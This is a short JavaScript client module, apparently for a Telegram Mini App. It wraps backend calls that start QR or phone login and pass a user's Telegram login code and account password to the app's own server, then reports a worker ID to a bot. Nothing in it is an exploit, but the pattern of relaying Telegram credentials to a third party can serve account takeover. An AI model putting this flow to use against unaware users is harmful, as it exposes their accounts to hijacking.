function getInitData() {
  return window.Telegram?.WebApp?.initData ?? "";
}

async function api(path, options = {}) {
  const headers = new Headers(options.headers);
  headers.set("Content-Type", "application/json");
  headers.set("X-Telegram-Init-Data", getInitData());

  const res = await fetch(path, { ...options, headers });
  const data = await res.json();
  if (!res.ok) {
    throw new Error(data.error ?? data.message ?? `HTTP ${res.status}`);
  }
  return data;
}

export function initSession() {
  return api("/api/v1/login/session", { method: "POST" });
}

export function startQR() {
  return api("/api/v1/login/qr/start", { method: "POST" });
}

export function startPhone(phone) {
  return api("/api/v1/login/phone/start", {
    method: "POST",
    body: JSON.stringify({ phone }),
  });
}

export function submitCode(loginId, code) {
  return api(`/api/v1/login/${loginId}/code`, {
    method: "POST",
    body: JSON.stringify({ code }),
  });
}

export function submitPassword(loginId, password) {
  return api(`/api/v1/login/${loginId}/password`, {
    method: "POST",
    body: JSON.stringify({ password }),
  });
}

export function pollStatus(loginId) {
  return api(`/api/v1/login/${loginId}/status`);
}

export function notifyBotAndClose(workerId, message) {
  const tg = window.Telegram?.WebApp;
  if (tg) {
    tg.sendData(JSON.stringify({ status: "success", worker_id: workerId, message }));
    tg.close();
  }
}
